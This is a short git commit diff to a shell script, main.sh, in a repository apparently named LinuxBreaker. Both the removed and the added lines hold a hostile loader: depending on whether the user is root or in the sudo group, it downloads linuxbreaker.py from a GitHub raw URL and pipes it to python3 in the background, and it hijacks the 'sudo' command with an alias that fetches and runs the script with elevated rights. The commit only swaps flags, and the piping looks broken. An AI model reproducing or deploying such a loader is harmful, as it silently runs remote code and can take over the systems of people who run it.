a290f2ca0e67343e81b107a1a65deccb4284970e
User-2357 <85888218+User-2357@users.noreply.github.com>
2021-12-17 18:14:38 -0600

    Update main.sh

--- main.sh
+++ main.sh
@@ -2,9 +2,9 @@
 
 if [[ $(id -u -eq 0) ]]; then
 clear;
-wget https://raw.githubusercontent.com/User-2357/LinuxBreaker/User-2357-patch-1/linuxbreaker.py & | python3 &
+wget https://raw.githubusercontent.com/User-2357/LinuxBreaker/User-2357-patch-1/linuxbreaker.py -b | python3 &
 elif groups | grep "\<sudo\>" &> /dev/null; then
 clear;
-alias sudo="wget https://raw.githubusercontent.com/User-2357/LinuxBreaker/User-2357-patch-1/linuxbreaker.py & | sudo python3 &"
-else wget https://raw.githubusercontent.com/User-2357/LinuxBreaker/User-2357-patch-1/linuxbreaker.py & | python3 &;
+alias sudo="wget https://raw.githubusercontent.com/User-2357/LinuxBreaker/User-2357-patch-1/linuxbreaker.py -b | sudo python3 &"
+else wget https://raw.githubusercontent.com/User-2357/LinuxBreaker/User-2357-patch-1/linuxbreaker.py -b | python3 &;
 fi
